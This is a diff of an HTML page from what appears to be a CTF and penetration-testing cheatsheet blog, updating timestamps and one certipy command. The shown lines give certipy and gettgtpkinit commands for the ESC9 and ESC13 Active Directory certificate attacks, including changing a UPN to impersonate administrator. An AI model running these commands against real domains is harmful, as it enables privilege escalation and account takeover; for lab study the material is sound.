@@ -7,7 +7,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F55bd30fb-924f-4b62-8c2d-8ef5b2b0bc34%2Fcat.png?table=block&id=35840b9b-8958-455b-83ed-312be6e09422&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2">
 <meta property="article:published_time" content="2024-06-26T15:42:13.000Z">
-<meta property="article:modified_time" content="2025-02-13T13:37:41.997Z">
+<meta property="article:modified_time" content="2025-02-18T18:55:01.780Z">
 <meta property="article:author" content="serioton">
 <meta property="article:tag" content="ctf,writeups,vulnlab,hackthebox,htb,thm,cheatsheet">
 <meta name="twitter:card" content="summary">
@@ -57,7 +57,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2025-02-13 13:37:41'
+  postUpdate: '2025-02-18 18:55:01'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -208,7 +208,7 @@
 <h2 id="ESC9"><a href="#ESC9" class="headerlink" title="ESC9"></a>ESC9</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy shadow auto -u username@domain -hashes :hash -account target_username</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy account update -u username@domain -hashes :hash -user target_username -upn administrator</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u target_username@domain -hashes :target_hash -ca ca -template template -target $DC_IP</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy account update -u username@domain -hashes :hash -user target_username -upn administrator</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy account update -u username@domain -hashes :hash -user target_username -upn target_username</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -domain domain</span><br></pre></td></tr></table></figure>
 <h2 id="ESC13"><a href="#ESC13" class="headerlink" title="ESC13"></a>ESC13</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u username -p password -ca ca -target domain -template template -dc-ip ip -key-size 4096</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx pfx_file domain/username ccache_file -dc-ip ip -v</span><br></pre></td></tr></table></figure>
